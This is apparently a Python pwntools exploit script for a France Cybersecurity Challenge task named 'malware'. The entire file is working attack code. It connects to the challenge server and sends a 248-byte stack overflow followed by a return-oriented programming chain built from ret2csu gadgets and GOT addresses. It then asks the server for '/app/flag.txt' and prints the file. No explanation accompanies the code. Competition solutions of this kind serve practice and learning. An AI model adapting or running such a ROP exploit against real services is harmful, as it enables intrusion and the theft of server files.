#!/usr/bin/python3
from pwn import remote, p64, ELF

elf = ELF("./malware")

def start():
    p = remote("challenges2.france-cybersecurity-challenge.fr", 4007)
    return p

io = start()
payload = b""

puts_got = p64(0x407068)
rand_got = p64(0x4071E8)
recv_got = p64(0x4070A8)

def ret2csu(rdx, rbx=0, rbp=0, r12=0, r13=0, r14=0, r15=0):
    global payload
    
    r14 = rdx
    rbx = 0
    r15 = recv_got
    r12 = p64(4)
    rbp = 0x1

    payload += p64(0x403D12)
    payload += p64(rbx)
    payload += p64(rbp)
    payload += r12
    payload += p64(r13)
    payload += r14
    payload += r15

    payload += p64(0x403CF8)
    payload += p64(0)*7

# 0x0000000000403d1b : pop rdi ; ret
# 0x0000000000403d19 : pop rsi ; pop r15 ; ret
# 0x0000000000402509 : pop rbp ; ret

POP_RBP = 0x0000000000402509

###########

VSYSCALL = 0xFFFFFFFFFF600000
POP_RDI_RET = 0x0000000000403d1b
SET_RAX_RBP_78 = 0x403CB2
GOT_WRITE = 0x407260

ret2csu(p64(22), r13=0x407260)

payload += p64(POP_RBP)
payload += p64(GOT_WRITE + 0xf4 + 14)
payload += p64(POP_RDI_RET)
payload += p64(GOT_WRITE)
payload += p64(0x4033F0)
payload += p64(0x403281)

io.send(b"*"*248 + payload + b";")
io.clean()
io.send(b"/app/flag.txt\0" + p64(4))
print(io.recvall())